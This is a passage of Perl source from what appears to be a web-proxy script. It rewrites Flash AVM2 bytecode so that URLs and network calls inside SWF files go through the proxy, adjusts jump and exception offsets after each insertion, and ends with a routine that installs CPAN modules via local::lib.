	       . "\x2b\x2c" . &set_swf_u30_32($string_count+17)
	       . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02\x2b" ;
    $pre_apply_ins= "\x56\x02\x2b\x2a\x60" . &set_swf_u30_32($multiname_count+2)
		  . "\x66" . &set_swf_u30_32($multiname_count+3)
		  . "\x14" . &set_swf_s24(length($after_jump)) . $after_jump
		  . "\x2b\x2a\x46" . &set_swf_u30_32($multiname_count+8)
		  . "\x00\x2b\x2a\x46" . &set_swf_u30_32($multiname_count+8)
		  . "\x00\x2b\x29" ;


    # Handle one method body at a time
    for my $mb (0..$count-1) {
	$pos= pos($$in) ;
	&skip_swf_u30_u32_s32($in) ;
	push(@out, substr($$in, $pos, pos($$in)-$pos)) ;

	# The max_stack setting for each method has to be increased by 5.
	my $max_stack= &get_swf_u30_32($in) ;
	push(@out, &set_swf_u30_32($max_stack+5)) ;

	$pos= pos($$in) ;
	&skip_swf_u30_u32_s32($in) for 1..3 ;
	push(@out, substr($$in, $pos, pos($$in)-$pos)) ;

	# proxify the code segment!
	$code_length= &get_swf_u30_32($in) ;
	$code= substr($$in, pos($$in), $code_length) ;
	pos($$in)+= $code_length ;
	($code, $insertions)=
	    &proxify_swf_avm2_code($code, $proxify_top_url_ins, $post_construct_ins,
		$pre_connect_ins, $pre_play_ins, $post_loaderURL_ins,
		$replace_get_url_ins_format1, $replace_get_url_ins_format2,
		$pre_coerce_ins_part1, $pre_coerce_ins_part2,
		$mn_specials, $mb, $alert_ins, $pre_call_ins_format, $pre_call_ins_loop,
		$pre_apply_ins) ;
	push(@out, &set_swf_u30_32(length($code)), $code) ;

	# Exceptions each have three references to code positions that must be updated.
	$exception_count= &get_swf_u30_32($in) ;
	push(@out, &set_swf_u30_32($exception_count)) ;
	push(@out, &proxify_exception_info($in, $insertions)) for (1..$exception_count) ;

	$pos= pos($$in) ;
	$trait_count= &get_swf_u30_32($in) ;
	&get_swf_traits_info($in)  for (1..$trait_count) ;
	push(@out, substr($$in, $pos, pos($$in)-$pos)) ;
    }

    return join('', @out) ;
}


sub proxify_exception_info {
    my($in, $insertions)= @_ ;
    my($from, $to, $target)= (&get_swf_u30_32($in), &get_swf_u30_32($in), &get_swf_u30_32($in)) ;
    foreach my $i (@$insertions) {
	$from+=   $i->{len} if $from   > $i->{pos} ;
	$to+=     $i->{len} if $to     >= $i->{pos} ;
	$target+= $i->{len} if $target > $i->{pos} ;
    }
    my $ret= &set_swf_u30_32($from) . &set_swf_u30_32($to) . &set_swf_u30_32($target) ;
    my $pos= pos($$in) ;
    &skip_swf_u30_u32_s32($in) ;
    &skip_swf_u30_u32_s32($in) ;
    return $ret . substr($$in, $pos, pos($$in)-$pos) ;
}


sub proxify_swf_avm2_code {
    my($code, $proxify_top_url_ins, $post_construct_ins,
       $pre_connect_ins, $pre_play_ins, $post_loaderURL_ins,
       $replace_get_url_ins_format1, $replace_get_url_ins_format2,
       $pre_coerce_ins_part1, $pre_coerce_ins_part2,
       $mn_specials, $mb, $alert_ins, $pre_call_ins_format, $pre_call_ins_loop,
       $pre_apply_ins)= @_ ;
    my(@out, $out_len, $old_out_len, $old_code_pos, $op, @params, $param_st, $pos, $out,
       $target, @insertions, @jumps, $pre_coerce_ins, $after_jump) ;
    &set_AVM2_BYTECODES() unless $AVM2_BYTECODES ;

    my $post_construct_ins_len= length($post_construct_ins) ;
    my $pre_connect_ins_len= length($pre_connect_ins) ;
    my $pre_play_ins_len= length($pre_play_ins) ;
    my $post_loaderURL_ins_len= length($post_loaderURL_ins) ;
    my $proxify_top_url_ins_len= length($proxify_top_url_ins) ;
    my $pre_apply_ins_len= length($pre_apply_ins) ;

use vars qw($test) ;

    # Loop through $code, one instruction at a time.
    # jsm-- must account for $code > \xff ?
    while ($code=~ /\G(.)/gcs) {
	$op= $1 ;
	$old_code_pos= pos($code)-1 ;
	$old_out_len= $out_len ;
&HTMLdie(['Bad opcode: [%s] at position %s in method body %s.', swf2perl($op), $old_code_pos, $mb])
unless defined $AVM2_BYTECODES->[ord($op)] ;    # jsm

	# Read in any parameters for this instruction.
	@params= () ;
	if ($AVM2_BYTECODES->[ord($op)]{params}) {
	    $pos= pos($code) ;
	    foreach my $f (@{ $AVM2_BYTECODES->[ord($op)]{params} }) {
		push(@params, $f->(\$code)) ;
	    }
	    $param_st= substr($code, $pos, pos($code)-$pos) ;
	} else {
	    $param_st= '' ;
	}

	# Because some insertions are before the instruction and some are
	#   after, we must push the instruction inside the conditional.

	# Insert a code bit after every contruct.
	if ($op eq "\x42") {
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;

	    push(@insertions, {pos => $out_len, len => $post_construct_ins_len}) ;
	    push(@out, $post_construct_ins) ;
	    $out_len+= $post_construct_ins_len ;


	# Insert a code bit after every constructprop, but only if the index
	#   parameter references a "URLRequest" string.
	# jsm-- should handle runtime multinames too....
	} elsif ($op eq "\x4a") {
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;

	    foreach (@{$mn_specials->{URLRequest}}) {
		if ($params[0]==$_) {
		    push(@insertions, {pos => $out_len, len => $post_construct_ins_len}) ;
		    push(@out, $post_construct_ins) ;
		    $out_len+= $post_construct_ins_len ;
		    last ;
		}
	    }

	# Insert a code bit before every coerce, but only if the index parameter
	#   references a "URLRequest" string.
	# Gets a bit messy avoiding double-proxifying here.
	# jsm-- should handle runtime multinames too....
	} elsif ($op eq "\x80") {
	    # Next two lines would be after block below if it worked, but
	    #   for now we'll just use $post_construct_ins instead of $pre_coerce_ins .
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;
	    foreach (@{$mn_specials->{URLRequest}}) {
		if ($params[0]==$_) {
		    # jsm-- this could result in double-proxifying of URLs.  The
		    #   commented-out section below could solve that, but has some
		    #   bug that doesn't proxify every URL in a SWF.  So for now,
		    #   keep the privacy hole closed and risk double-proxifying some
		    #   URLs.  The downside is that either @BANNED_NETWORKS can't
		    #   include localhost, or that we disable double-proxified URLs
		    #   in _proxy_jslib_full_url(), meaning that chained accesses
		    #   through the same script won't proxify Flash correctly.
		    ## This is the part of this insertion that varies-- also messy.
		    #$after_jump= "\x80" . $param_st . $pre_coerce_ins_part2 . &set_swf_s24(1+length($param_st)) ;
		    #$pre_coerce_ins= $pre_coerce_ins_part1 . &set_swf_s24(length($after_jump)) . $after_jump ;
		    #$pre_coerce_ins= "\x2a\x12" . &set_swf_s24(length($pre_coerce_ins)) . $pre_coerce_ins ;
		    #push(@insertions, {pos => $out_len, len => length($pre_coerce_ins)}) ;
		    #push(@out, $pre_coerce_ins) ;
		    #$out_len+= length($pre_coerce_ins) ;
		    push(@insertions, {pos => $out_len, len => $post_construct_ins_len}) ;
		    push(@out, $post_construct_ins) ;
		    $out_len+= $post_construct_ins_len ;
		    last ;
		}
	    }

	# Insert a code bit before every callpropvoid, but only if the index
	#   parameter references a "connect" or "play".  We do the same for
	#   callproperty-- even though the compiler doesn't use it for
	#   NetConnection.connect() and NetStream.play(), privacy could be
	#   compromised if a malicious server uses callproperty.
	# Also, do this for callsuper and callsupervoid.
	} elsif ($op eq "\x4f" or $op eq "\x46" or $op eq "\x45" or $op eq "\x4e") {
	    my $done ;
	    foreach (@{$mn_specials->{'connect'}}) {
		if ($params[0]==$_) {
		    # connect() can have more than one param, but we wouldn't handle
		    #   that correctly with what we have.
		    if ($params[1]==1) {
			push(@insertions, {pos => $out_len, len => $pre_connect_ins_len}) ;
			push(@out, $pre_connect_ins) ;
			$out_len+= $pre_connect_ins_len ;
		    }
		    $done= 1 ;
		    last ;
		}
	    }
	    if (!$done) {
		foreach (@{$mn_specials->{play}}) {
		    if ($params[0]==$_) {
			# To avoid some false positives, require that the second param is 1.
			if ($params[1]==1) {
			    push(@insertions, {pos => $out_len, len => $pre_play_ins_len}) ;
			    push(@out, $pre_play_ins) ;
			    $out_len+= $pre_play_ins_len ;
			}
			$done= 1 ;
			last ;
		    }
		}
	    }
	    if (!$done) {
		foreach (@{$mn_specials->{call}}) {
		    if ($params[0]==$_) {
			my $ins= sprintf($pre_call_ins_format, &set_swf_u30_32($params[1]), $pre_call_ins_loop x $params[1]) ;
			push(@insertions, {pos => $out_len, len => length($ins)}) ;
			push(@out, $ins) ;
			$out_len+= length($ins) ;
			$done= 1 ;
			last ;
		    }
		}
	    }
	    if (!$done) {
		foreach (@{$mn_specials->{apply}}) {
		    if ($params[0]==$_) {
			# To avoid some false positives, require that the second param is 2.
			if ($params[1]==2) {
			    push(@insertions, {pos => $out_len, len => $pre_apply_ins_len}) ;
			    push(@out, $pre_apply_ins) ;
			    $out_len+= $pre_apply_ins_len ;
			}
			$done= 1 ;
			last ;
		    }
		}
	    }
	    if (!$done) {
		foreach (@{$mn_specials->{loadPolicyFile}}) {
		    if ($params[0]==$_) {
			push(@insertions, {pos => $out_len, len => $proxify_top_url_ins_len}) ;
			push(@out, $proxify_top_url_ins) ;
			$out_len+= $proxify_top_url_ins_len ;
			last ;
		    }
		}
	    }

	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;


	# Record every jump, to be updated later.
	# All jump opcodes are in the range \x0c-\x1a except for lookupswitch (\x1b).
	# $jumps[]{pos} is the position of the offset parameter of the jump
	#   action, which is 3 bytes earlier than the current $out_len.
	# Note that {pos} is based on $out_len (i.e. post-processing position),
	#   while {target} and {base} are based on pos($code) (i.e.
	#   pre-processing position).
	} elsif ($op=~ /^[\x0c-\x1a]$/) {
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;
	    push(@jumps, {pos => $out_len-3,
			  target => pos($code)+$params[0],
			  base => pos($code)}) ;

	# Handle lookupswitch, which needs special care.
	} elsif ($op eq "\x1b") {
	    $old_out_len= $out_len ;
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;

	    # First, add the default jump.
	    push(@jumps, {pos => $old_out_len+length($op),
			  target => $old_code_pos+$params[0][0],
			  base => $old_code_pos,
			  is_ls => 1}) ;
	    # Then, add all the case jumps, which come after a u30 that we must skip.
	    my $case_pos= $out_len - 3*($params[0][1]+1) ;
	    for (2..$params[0][1]+2) {
		push(@jumps, {pos => $case_pos,
			      target => $old_code_pos+$params[0][$_],
			      base => $old_code_pos,
			      is_ls => 1}) ;
		$case_pos+= 3 ;
	    }


	# Insert a code bit before every getproperty, but only if the index
	#   parameter references a "loaderURL" (for flash.display.LoaderInfo.loaderURL)
	#   or a "url".  If "url", does a replacement rather than a prepending.
	} elsif ($op eq "\x66") {
	    my $done ;

	    foreach (@{$mn_specials->{loaderURL}}) {
		if ($params[0]==$_) {
		    push(@out, $op, $param_st) ;
		    $out_len+= length($op)+length($param_st) ;
		    push(@insertions, {pos => $out_len, len => $post_loaderURL_ins_len}) ;
		    push(@out, $post_loaderURL_ins) ;
		    $out_len+= $post_loaderURL_ins_len ;
		    $done= 1 ;
		    last ;
		}
	    }
	    if (!$done) {
		foreach (@{$mn_specials->{url}}) {
		    if ($params[0]==$_) {
			# First format string has three %s: (length of getproperty instruction)+4, $param_st,
			#   (length of $replace_get_url_ins_format2) .
			# Second format string has one %s, set to $param_st .
			my $inst_len= length($op . $param_st) ;
			my $ins2= sprintf($replace_get_url_ins_format2, $param_st) ;
			my $ins= sprintf($replace_get_url_ins_format1,
			      &set_swf_s24($inst_len+4), $param_st, &set_swf_s24(length($ins2)))
			    . $ins2 ;
			push(@insertions, {pos => $out_len, len => length($ins)-$inst_len}) ;
			push(@out, $ins) ;
			$out_len+= length($ins) ;
			$done= 1 ;
			last ;
		    }
		}
	    }
	    if (!$done) {
		push(@out, $op, $param_st) ;
		$out_len+= length($op)+length($param_st) ;
	    }


	} else {
	    push(@out, $op, $param_st) ;
	    $out_len+= length($op)+length($param_st) ;
	}
    }

    $out= join('', @out) ;

    if (@insertions) {
	# Update all jump targets in place in $out.
	# For lookupswitch jumps, increase the base address when $j->{base}==$i->{pos} ,
	#   but for normal jumps don't.
	foreach my $j (@jumps) {
	    foreach my $i (@insertions) {
		$j->{target}+= $i->{len}  if $j->{target} > $i->{pos} ;
		$j->{base}+=   $i->{len}  if $j->{is_ls}  ? ($j->{base} >= $i->{pos})  : ($j->{base} > $i->{pos}) ;
	    }
	    substr($out, $j->{pos}, 3)= &set_swf_s24($j->{target} - $j->{base}) ;
	}
    }

    return ($out, \@insertions) ;
}


sub skip_swf_u30_u32_s32 {
    ${$_[0]}=~ /\G[\x80-\xff]{0,4}[\0-\x7f]/gcs ;
    return ;
}

sub get_swf_u30_32 {
    my($in)= @_ ;
    return ord($1) if $$in=~ /\G([\0-\x7f])/gc ;    # shortcut for common case
    $$in=~ /\G([\x80-\xff]{0,4}[\0-\x7f])/gc ;
    my $ret= reverse $1 ;
    substr($ret, 0, 1)|= "\x80" ;
    substr($ret, -1, 1)&= "\x7f" ;
    return unpack('w', $ret) ;

#    my($total, $i) ;
#    my(@bytes)= split(//, $1) ;
#    $total+= (ord($_) & 0x7f) << (7 * $i++)  foreach (@bytes) ;
#    return $total ;
}


sub set_swf_u30_32 {
    my($val)= @_ ;
    return chr($val) if $val <= 0x7f ;    # shortcut for common case
    my $ret= reverse pack('w', $val) ;
    substr($ret, 0, 1)|= "\x80" ;
    substr($ret, -1, 1)&= "\x7f" ;
    return $ret ;
}


sub get_swf_u8 {
    my($in)= @_ ;
    $$in=~ /\G(.)/gcs ;
    return ord($1) ;
}

sub get_swf_s24 {
    my($in)= @_ ;
    $$in=~ /\G(.)(.)(.)/gcs ;
    my $val= ord($1) + (ord($2)<<8) + (ord($3)<<16) ;
    # Set sign if needed.
    $val= -(~$val & 0xffffff) - 1  if $val & 0x800000 ;
    return $val ;
}

sub set_swf_s24 {
    my($val)= @_ ;
    # Note that 'V' template is for unsigned, but pack() seems to accept
    #   negative input.
    return substr(pack('V', $val), 0, 3) ;
}


# Strings are in UTF-8 with preceding u30 size in bytes.
# In UTF-8, bytes not starting with "10" start a character, and bytes
#   starting with "10" are continuation bytes in the same character.
sub get_swf_string {
    my($in)= @_ ;
    my($size)= &get_swf_u30_32($in) ;
    my $ret= substr($$in, pos($$in), $size) ;
    pos($$in)+= $size ;
    return $ret ;
}

# One u30 count followed by u30[count] .
sub get_swf_ns_set {
    my($in)= @_ ;
    my $start_pos= pos($$in) ;
    my $count= &get_swf_u30_32($in) ;
    &skip_swf_u30_u32_s32($in)  foreach (1..$count) ;
    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}

sub get_swf_multiname {
    my($in, $mn_id, $n_specials, $mn_specials)= @_ ;
    my $start_pos= pos($$in) ;
    my($kind, $count) ;
    $$in=~ /\G(.)/gcs  && ($kind= ord($1)) ;
    if ($kind==0x07) {                         # QName
	&skip_swf_u30_u32_s32($in) ;
	my $name_id= &get_swf_u30_32($in) ;
	foreach my $p (qw(connect play URLRequest loaderURL loadPolicyFile url call apply)) {
	    ($name_id==$_) && push(@{$mn_specials->{$p}}, $mn_id)  foreach (@{$n_specials->{$p}}) ;
	}
    } elsif ($kind==0x0d) {                    # QName, for attributes
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
    } elsif ($kind==0x0f or $kind==0x10) {     # RTQName
	&skip_swf_u30_u32_s32($in) ;
    } elsif ($kind==0x11 or $kind==0x12) {     # RTQNameL
    } elsif ($kind==0x13 or $kind==0x14) {     # NameL
    } elsif ($kind==0x09 or $kind==0x0e) {     # Multiname
	my $name_id= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in) ;
	foreach my $p (qw(connect play URLRequest loaderURL loadPolicyFile url call apply)) {
	    ($name_id==$_) && push(@{$mn_specials->{$p}}, $mn_id)  foreach (@{$n_specials->{$p}}) ;
	}
    } elsif ($kind==0x1b or $kind==0x1c) {     # MultinameL
	&skip_swf_u30_u32_s32($in) ;
    } elsif ($kind==0x1d) {                    # ???
	&skip_swf_u30_u32_s32($in) ;
	$count= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in)  foreach (1..$count) ;
    }

    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}

sub get_swf_option_info {
    my($in)= @_ ;
    my $count= &get_swf_u30_32($in) ;
    for (1..$count) {           # option_detail
	&skip_swf_u30_u32_s32($in) ;
	pos($$in)++ ;
    }
}

sub get_swf_traits_info {
    my($in)= @_ ;
    my($kind, $flags, $vindex, $metadata_count) ;
    &skip_swf_u30_u32_s32($in) ;
    $$in=~ /\G(.)/gcs  && (($kind, $flags)= (ord($1) & 0x0f, ord($1)>>4)) ;
    if ($kind==0 or $kind==6) {     # Trait_Slot or Trait_Const
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
	$vindex= &get_swf_u30_32($in) ;
	pos($$in)++  if $vindex ;
    } elsif ($kind==4) {            # Trait_Class
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
    } elsif ($kind==5) {            # Trait_Function
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
    } elsif ($kind==1 or $kind==2 or $kind==3) {   # Trait_Method, Trait_Getter, or Trait_Setter
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
    }
    if ($flags & 0x04) {     # metadata
	$metadata_count= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in)  for (1..$metadata_count) ;
    }
}


sub get_swf_lookupswitch {
    my($in)= @_ ;
    my(@ret) ;
    push(@ret, &get_swf_s24($in)) ;
    my($count)= &get_swf_u30_32($in) ;
    push(@ret, $count) ;
    push(@ret, &get_swf_s24($in))  for (1..$count+1) ;

    return \@ret ;
}



sub swf2perl {
    my($in)= @_ ;
    my($out) ;
    while ($in=~ /\G(.)/gcs) {
	my($chr)= $1 ;
	my($ord)= ord($chr) ;
	my($digit_follows) ;
	if ($in=~ /\G\d/gcs) {
	    $digit_follows= 1 ;
	    pos($in)-- ;
	}

	if ($ord==36 or $ord==64 or $ord==92 or $ord==34) {
	    $out.= "\\".chr($ord) ;
	} elsif ($ord>=32 and $ord<=126) {
	    $out.= chr($ord) ;
	} elsif ($ord>=1 and $ord<=26) {
	    $out.= "\\c".chr($ord+64) ;
	} elsif ($ord==0 and !$digit_follows) {
	    $out.= "\\0" ;
	} else {
	    $out.= "\\x".sprintf(($ord>255 ? "{%04x}" : "%02x"), $ord) ;
	}
    }
    return $out ;
}


sub set_AVM2_BYTECODES {
    my $AVM2_hash= {
	"\xa0" => {name => 'add'},
	"\xc5" => {name => 'add_i'},
	"\x53" => {name => 'applytype',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x86" => {name => 'astype',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x87" => {name => 'astypelate'},
	"\xa8" => {name => 'bitand'},
	"\x97" => {name => 'bitnot'},
	"\xa9" => {name => 'bitor'},
	"\xaa" => {name => 'bitxor'},
	"\x41" => {name => 'call',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x43" => {name => 'callmethod',
		   params => [\&skip_swf_u30_u32_s32, \&skip_swf_u30_u32_s32]},
	"\x46" => {name => 'callproperty',
		   params => [\&get_swf_u30_32, \&get_swf_u30_32]},
	"\x4c" => {name => 'callproplex',
		   params => [\&skip_swf_u30_u32_s32, \&skip_swf_u30_u32_s32]},
	"\x4f" => {name => 'callpropvoid',
		   params => [\&get_swf_u30_32, \&get_swf_u30_32]},
	"\x44" => {name => 'callstatic',
		   params => [\&skip_swf_u30_u32_s32, \&skip_swf_u30_u32_s32]},
	"\x45" => {name => 'callsuper',
		   params => [\&get_swf_u30_32, \&get_swf_u30_32]},
	"\x4e" => {name => 'callsupervoid',
		   params => [\&get_swf_u30_32, \&get_swf_u30_32]},
	"\x78" => {name => 'checkfilter'},
	"\x80" => {name => 'coerce',
		   params => [\&get_swf_u30_32]},
	"\x82" => {name => 'coerce_a'},
	"\x85" => {name => 'coerce_s'},
	"\x42" => {name => 'construct',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x4a" => {name => 'constructprop',
		   params => [\&get_swf_u30_32, \&skip_swf_u30_u32_s32]},
	"\x49" => {name => 'constructsuper',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x76" => {name => 'convert_b'},
	"\x75" => {name => 'convert_d'},
	"\x73" => {name => 'convert_i'},
	"\x77" => {name => 'convert_o'},
	"\x70" => {name => 'convert_s'},
	"\x74" => {name => 'convert_u'},
	"\xef" => {name => 'debug',
		   params => [\&get_swf_u8, \&get_swf_u30_32, \&get_swf_u8, \&get_swf_u30_32]},
	"\xf1" => {name => 'debugfile',
		   params => [\&get_swf_u30_32]},
	"\xf0" => {name => 'debugline',
		   params => [\&get_swf_u30_32]},
	"\x94" => {name => 'declocal'},
	"\xc3" => {name => 'declocal_i'},
	"\x93" => {name => 'decrement'},
	"\xc1" => {name => 'decrement_i'},
	"\x6a" => {name => 'deleteproperty',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xa3" => {name => 'divide'},
	"\x2a" => {name => 'dup'},
	"\x06" => {name => 'dxns',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x07" => {name => 'dxnslate'},
	"\xab" => {name => 'equals'},
	"\x72" => {name => 'esc_xattr'},
	"\x71" => {name => 'esc_xelem'},
	"\x5e" => {name => 'findproperty',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x5d" => {name => 'findpropstrict',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x59" => {name => 'getdescendants',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x64" => {name => 'getglobalscope'},
	"\x6e" => {name => 'getglobalslot',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x60" => {name => 'getlex',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x62" => {name => 'getlocal',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xd0" => {name => 'getlocal_0'},
	"\xd1" => {name => 'getlocal_1'},
	"\xd2" => {name => 'getlocal_2'},
	"\xd3" => {name => 'getlocal_3'},
	"\x66" => {name => 'getproperty',
		   params => [\&get_swf_u30_32]},
	"\x65" => {name => 'getscopeobject',
		   params => [\&get_swf_u8]},
	"\x6c" => {name => 'getslot',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x04" => {name => 'getsuper',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xb0" => {name => 'greaterequals'},         # note error in spec
	"\xaf" => {name => 'greaterthan'},
	"\x1f" => {name => 'hasnext'},
	"\x32" => {name => 'hasnext2',
		   params => [\&skip_swf_u30_u32_s32, \&skip_swf_u30_u32_s32]},   # just a guess... :P
	"\x13" => {name => 'ifeq',
		   params => [\&get_swf_s24]},
	"\x12" => {name => 'iffalse',
		   params => [\&get_swf_s24]},
	"\x18" => {name => 'ifge',
		   params => [\&get_swf_s24]},
	"\x17" => {name => 'ifgt',
		   params => [\&get_swf_s24]},
	"\x16" => {name => 'ifle',
		   params => [\&get_swf_s24]},
	"\x15" => {name => 'iflt',
		   params => [\&get_swf_s24]},
	"\x14" => {name => 'ifne',
		   params => [\&get_swf_s24]},
	"\x0f" => {name => 'ifnge',
		   params => [\&get_swf_s24]},
	"\x0e" => {name => 'ifngt',
		   params => [\&get_swf_s24]},
	"\x0d" => {name => 'ifnle',
		   params => [\&get_swf_s24]},
	"\x0c" => {name => 'ifnlt',
		   params => [\&get_swf_s24]},
	"\x19" => {name => 'ifstricteq',
		   params => [\&get_swf_s24]},
	"\x1a" => {name => 'ifstrictne',
		   params => [\&get_swf_s24]},
	"\x11" => {name => 'iftrue',
		   params => [\&get_swf_s24]},
	"\xb4" => {name => 'in'},
	"\x92" => {name => 'inclocal',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xc2" => {name => 'inclocal_i',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x91" => {name => 'increment'},
	"\xc0" => {name => 'increment_i'},
	"\x68" => {name => 'initproperty',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xb1" => {name => 'instanceof'},
	"\xb2" => {name => 'istype',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xb3" => {name => 'istypelate'},
	"\x10" => {name => 'jump',
		   params => [\&get_swf_s24]},
	"\x08" => {name => 'kill',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x09" => {name => 'label'},
	"\xae" => {name => 'lessequals'},
	"\xad" => {name => 'lessthan'},
	"\x38" => {name => 'lf32'},
	"\x39" => {name => 'lf64'},
	"\x35" => {name => 'li8'},
	"\x36" => {name => 'li16'},
	"\x37" => {name => 'li32'},
	"\x1b" => {name => 'lookupswitch',
		   params => [\&get_swf_lookupswitch]},
	"\xa5" => {name => 'lshift'},
	"\xa4" => {name => 'modulo'},
	"\xa2" => {name => 'multiply'},
	"\xc7" => {name => 'multiply_i'},
	"\x90" => {name => 'negate'},
	"\xc4" => {name => 'negate_i'},
	"\x57" => {name => 'newactivation'},
	"\x56" => {name => 'newarray',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x5a" => {name => 'newcatch',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x58" => {name => 'newclass',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x40" => {name => 'newfunction',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x55" => {name => 'newobject',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x1e" => {name => 'nextname'},
	"\x23" => {name => 'nextvalue'},
	"\x02" => {name => 'nop'},
	"\x96" => {name => 'not'},
	"\x29" => {name => 'pop'},
	"\x1d" => {name => 'popscope'},
	"\x24" => {name => 'pushbyte',
		   params => [\&get_swf_u8]},
	"\x2f" => {name => 'pushdouble',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x27" => {name => 'pushfalse'},
	"\x2d" => {name => 'pushint',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x31" => {name => 'pushnamespace',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x28" => {name => 'pushnan'},
	"\x20" => {name => 'pushnull'},
	"\x30" => {name => 'pushscope'},
	"\x25" => {name => 'pushshort',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x2c" => {name => 'pushstring',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x26" => {name => 'pushtrue'},
	"\x2e" => {name => 'pushuint',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x21" => {name => 'pushundefined'},
	"\x1c" => {name => 'pushwith'},
	"\x48" => {name => 'returnvalue'},
	"\x47" => {name => 'returnvoid'},
	"\xa6" => {name => 'rshift'},
	"\x6f" => {name => 'setglobalslot',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x63" => {name => 'setlocal',
		   params => [\&skip_swf_u30_u32_s32]},
	"\xd4" => {name => 'setlocal_0'},
	"\xd5" => {name => 'setlocal_1'},
	"\xd6" => {name => 'setlocal_2'},
	"\xd7" => {name => 'setlocal_3'},
	"\x61" => {name => 'setproperty',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x6d" => {name => 'setslot',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x05" => {name => 'setsuper',
		   params => [\&skip_swf_u30_u32_s32]},
	"\x3d" => {name => 'sf32'},
	"\x3e" => {name => 'sf64'},
	"\x3a" => {name => 'si8'},
	"\x3b" => {name => 'si16'},
	"\x3c" => {name => 'si32'},
	"\xac" => {name => 'strictequals'},
	"\xa1" => {name => 'subtract'},
	"\xc6" => {name => 'subtract_i'},
	"\x2b" => {name => 'swap'},
	"\x50" => {name => 'sxi_1'},
	"\x51" => {name => 'sxi_8'},
	"\x52" => {name => 'sxi_16'},
	"\x03" => {name => 'throw'},
	"\x95" => {name => 'typeof'},
	"\xa7" => {name => 'urshift'},
    } ;

    @$AVM2_BYTECODES[map {ord} keys %$AVM2_hash]= (values %$AVM2_hash) ;
}


sub install_modules {
    my(@modules)= @_ ;
    my($installed_local_lib, %env) ;

    # This is the default-- the complete set of modules.
    @modules= qw(Net::SSLeay  JSON
		 IO::Compress::Gzip  IO::Compress::Deflate  IO::Compress::Lzma)
	unless @modules ;
    
    my $needs_local_lib ;
    foreach (@modules) {
	eval "require $_" ;
	$needs_local_lib= 1, last  if $@ ;
    }

    require CPAN ;   # big module; don't require until needed
    require CPAN::FirstTime ;

    # local::lib lets us install modules under $HOME/perl5/ when we don't have
    #   root permissions.
    eval { require local::lib }  unless $>==0 ;
    
    if ($@ and $needs_local_lib) {
	# To bootstrap local::lib, we're supposed to use the manual command
	#   "perl Makefile.PL --bootstrap" when building.  Unfortunately, the
	#   CPAN module doesn't provide a way to pass a flag to that step of
	#   the process.  So here we emulate what happens in CPAN::FirstTime::init() ,
	#   which bootstraps the local::lib installation in the cpan utility.
	my $dist ;
	if ($dist= CPAN::Shell->expand('Module', 'local::lib')->distribution) {
	    $dist->{prefs}{pl}{commandline}= $LOCAL_LIB_DIR ne ''
		? "$^X Makefile.PL '--bootstrap=$LOCAL_LIB_DIR'"
		: "$^X Makefile.PL --bootstrap" ;
	    require lib ;
	    lib->import(CPAN::FirstTime::_local_lib_inc_path()) ;
	    eval { $dist->install } ;
	}
	if (!$dist or $@) {
	    die "Can't install local::lib: $@\n" ;
	} else {
	    require local::lib ;
	    $installed_local_lib= 1 ;
	    # Set environment variables, so subsequent installs work with local::lib .
	    # Next line is copied from CPAN::FirstTime::_local_lib_config(), except the
	    #   middle parameter of 0 has been added.  I think it's a bug in
	    #   CPAN::FirstTime::_local_lib_config(), as it disagrees with the code
	    #   in local::lib->build_environment_vars_for() .
	    my %env = local::lib->build_environment_vars_for(CPAN::FirstTime::_local_lib_path(), 0, 1) ;
	    @ENV{keys %env}= (values %env) ;
	}
    }

    # Clear these environment variables if root; otherwise, will install under
    #   user's $HOME.
